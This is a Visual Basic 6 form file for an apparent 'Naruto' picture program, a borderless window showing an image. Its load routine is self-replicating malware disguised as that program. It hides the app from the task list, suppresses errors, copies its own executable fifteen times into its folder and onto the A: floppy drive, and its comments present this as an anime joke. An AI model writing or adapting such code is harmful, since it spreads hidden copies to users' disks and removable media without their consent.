VERSION 5.00
Begin VB.Form frmNaruto 
   BackColor       =   &H0080C0FF&
   BorderStyle     =   0  'None
   ClientHeight    =   2250
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   2235
   FillColor       =   &H0080C0FF&
   ForeColor       =   &H0080C0FF&
   Icon            =   "frmNaruto.frx":0000
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MousePointer    =   11  'Hourglass
   Picture         =   "frmNaruto.frx":0442
   ScaleHeight     =   1939.655
   ScaleMode       =   0  'User
   ScaleWidth      =   1056.738
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.Image imgNaruto 
      Height          =   2250
      Left            =   0
      MousePointer    =   11  'Hourglass
      Picture         =   "frmNaruto.frx":0884
      Top             =   0
      Width           =   2250
   End
End
Attribute VB_Name = "frmNaruto"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim i As Integer
Dim source, destination As String

Private Sub Form_Load()
On Error Resume Next
imgNaruto.Height = frmNaruto.ScaleHeight
imgNaruto.Width = frmNaruto.ScaleWidth

'Wind walk?
App.TaskVisible = False

'Kage-bunshin technique
source = App.Path & "\" & App.EXEName & ".exe"
SetAttr source, vbNormal
For i = 1 To 15
    destination = App.Path & "\" & "Naruto." & i & ".exe"
    FileCopy source, destination
    SetAttr destination, vbNormal
Next
FileCopy source, "A:\" & "Naruto.exe"
End
End Sub
